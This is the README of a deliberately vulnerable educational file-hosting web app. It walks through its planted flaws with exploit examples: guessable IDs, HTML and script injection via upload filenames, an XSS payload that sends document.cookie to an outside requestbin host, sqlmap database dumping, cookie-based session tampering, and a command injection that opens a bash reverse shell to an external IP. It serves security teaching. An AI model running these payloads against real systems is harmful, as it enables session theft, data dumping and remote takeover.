# Vulnerable Filehoster

A web app to showcase some typical web application flaws.

**WARNING**: This software is for educational purposes only!

## Included issues

### Guessable IDs

Vulnerable in this example are:
* UserIds
  * Easily discover other users
* UploadIds
  * Download the stuff other people uploaded
  * Delete stuff you do not own

### HTML Injection
* eMail on registration form
  ```
  <h1 style="color: pink">some@user.com</h1>
  ```
* uploaded file name
  ```
  curl -X POST http://localhost:3000/api/upload -F "file=@myself-2012.jpg;filename=%3Ch1%3EA%20weird%20filename%3C%2Fh2%3E" --cookie "loggedInUserId=2"
  ```
* Script injection via `img` tag and `onerror` attribute
  ```
  # Bad payload:
  <img src="missing.jpg" onerror="alert('Some JavaScript just got executed...')" />

  # URLEncode and use payload as filename-parameter when uploading a file:
  curl -X POST http://localhost:3000/api/upload -F "file=@myself-2012.jpg;filename=%3Cimg%20src%3D%22missing.jpg%22%20onerror%3D%22alert%28%27Some%20JavaScript%20just%20got%20executed...%27%29%22%20%2F%3E" --cookie "loggedInUserId=12"
  ```
  
* Cookie extraction via ScriptInjection and https://requestbin.com
  ```
  # Bad Payload:
  <img src="missing.jpg" onerror="fetch('https://endlj4fkdulat.x.pipedream.net?cookies=' + document.cookie)" />

  # Reusing the HTML Injection in the uploaded file name:
  curl -X POST http://localhost:3000/api/upload -F "file=@myself-2012.jpg;filename=%3Cimg%20src%3D%22missing.jpg%22%20onerror%3D%22fetch%28%27https%3A%2F%2Fendlj4fkdulat.x.pipedream.net%3Fcookies%3D%27%20%2B%20document.cookie%29%22%20%2F%3E" --cookie "loggedInUserId=12"
  ```

### SQL Injection

The login form allows funny SQL commands. In order to execute an SQL Injection attack, you need to know a Username and Password. But since you can register accounts yourself, this is not a big issue. ;)

```
sqlmap --flush-session -u http://localhost:3000/login.html --forms --dump-all --ignore-code 401
```

When asked, provide the following post data: `email=<YOUR-EMAIL>*&password=<YOUR-PASSWORD>`
*Important: The aterisk (*) after `<YOUR-EMAIL>` is a special character giving sqlmap a hint, what is injectable!

Alternatively hit the API login endpoint directly:

```
sqlmap --flush-session -u http://localhost:3000/api/login --data "email=<YOUR-EMAIL>*&password=<YOUR-PASSWORD>" --dump-all --ignore-code 401
```

### Password Storage

* Passwords are stored as md5 hashes, see https://md5.gromweb.com
* And for the right way: [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

### Session Tampering / Hijacking

* Upload for someone else?
    * curl --cookie loggedInUserId=4711
* Become an admin?
    * /api/admin/cleanup


### Remote Shell

* Good Request:
  ```
  # directory=/home/
  curl http://localhost:3000/list-directory?directory=%2Fhome%2F
  ```
* Bad Request:
  ```
  # directory=/ ; bash -i >& /dev/tcp/178.63.25.243/7171 0>&1
  curl http://localhost:3000/list-directory?directory=%2F%20%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F178.63.25.243%2F7171%200%3E%261
  ```
* See https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
